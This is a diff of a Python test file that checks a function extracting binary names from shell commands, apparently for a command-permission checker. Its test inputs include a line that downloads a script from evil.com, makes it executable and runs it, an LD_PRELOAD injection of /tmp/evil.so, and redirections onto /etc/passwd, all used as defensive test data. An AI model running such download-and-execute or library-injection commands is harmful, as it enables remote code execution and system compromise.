@@ -90,9 +90,13 @@ def test_secret_masking():
 
 def test_extract_binaries_redirection():
     from main import extract_binaries
+    assert extract_binaries(">| /etc/passwd ls") == ["ls"]
+    assert extract_binaries("ls>/dev/null") == ["ls"]
+    assert extract_binaries("<< EOF cat") == ["cat"]
+    assert extract_binaries("2> /dev/null ls") == ["ls"]
+    assert extract_binaries("ls && >|/dev/null grep foo") == ["ls", "grep"]
     assert extract_binaries("ls >| /etc/passwd") == ["ls"]
     assert extract_binaries("ls > /dev/null") == ["ls"]
-    assert extract_binaries("ls >/dev/null") == ["ls"]
     assert extract_binaries("echo test; ls") == ["echo", "ls"]
     assert extract_binaries("curl http://evil.com/script.sh -o myscript.sh; chmod +x myscript.sh; ./myscript.sh") == ["curl", "chmod", "myscript.sh"]
     assert extract_binaries("LD_PRELOAD=/tmp/evil.so systemctl status") == ["systemctl"]
